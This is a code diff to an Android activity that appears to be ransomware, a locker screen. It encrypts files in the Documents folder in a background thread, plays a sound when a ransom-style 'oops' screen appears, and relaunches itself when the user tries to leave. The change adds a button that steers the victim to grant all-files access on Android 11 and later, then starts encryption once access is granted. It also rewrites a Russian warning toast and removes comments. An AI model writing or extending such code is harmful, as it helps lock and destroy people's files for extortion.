@@ -5,12 +5,16 @@ import android.content.Context;
 import android.content.Intent;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.provider.Settings;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.WindowManager;
+import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -48,16 +52,17 @@ public class LockActivity extends Activity {
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
 
-        // Шифрование файлов в фоне запускается сразу
         targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                encryptFiles(targetDir);
-            }
-        }).start();
+        
+        if (Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager()) {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    encryptFiles(targetDir);
+                }
+            }).start();
+        }
 
-        // Цикл обновления времени и громкости
         handler.post(new Runnable() {
             @Override
             public void run() {
@@ -76,11 +81,9 @@ public class LockActivity extends Activity {
         TextView bootText = findViewById(R.id.bootText);
         View mainBlock = findViewById(R.id.mainBlock);
 
-        // Сначала показываем загрузку
         bootText.setVisibility(View.VISIBLE);
         mainBlock.setVisibility(View.GONE);
 
-        // Логика анимации
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -91,7 +94,6 @@ public class LockActivity extends Activity {
                         bootText.setVisibility(View.GONE);
                         mainBlock.setVisibility(View.VISIBLE);
 
-                        // ЗВУК ВКЛЮЧАЕТСЯ ТУТ, КОГДА ПОЯВЛЯЕТСЯ ТЕКСТ "УПС"
                         if (mp == null) {
                             mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
                             if (mp != null) {
@@ -100,6 +102,10 @@ public class LockActivity extends Activity {
                             }
                         }
 
+                        Button grantButton = findViewById(R.id.grantButton);
+                        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
+                            grantButton.setVisibility(View.VISIBLE);
+                        }
                     }
                 }, 2000);
             }
@@ -107,6 +113,16 @@ public class LockActivity extends Activity {
 
         EditText passwordInput = findViewById(R.id.passwordInput);
         TextView enterButton = findViewById(R.id.enterButton);
+        Button grantButton = findViewById(R.id.grantButton);
+
+        grantButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if (Build.VERSION.SDK_INT >= 30) {
+                    startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
+                }
+            }
+        });
 
         enterButton.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -132,6 +148,23 @@ public class LockActivity extends Activity {
                 }
             }
         });
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
+            Button grantButton = findViewById(R.id.grantButton);
+            if (grantButton != null && grantButton.getVisibility() == View.VISIBLE) {
+                grantButton.setVisibility(View.GONE);
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        encryptFiles(targetDir);
+                    }
+                }).start();
+            }
+        }
     }
 
     private void encryptFiles(File dir) {
@@ -187,7 +220,7 @@ public class LockActivity extends Activity {
     protected void onPause() {
         super.onPause();
         if (!isUnlocked) {
-            Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА. ФАЙЛЫ УНИЧТОЖЕНЫ.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА БЛОКИРУЮ", Toast.LENGTH_SHORT).show();
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
             startActivity(intent);
@@ -204,4 +237,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-        }
+                        }
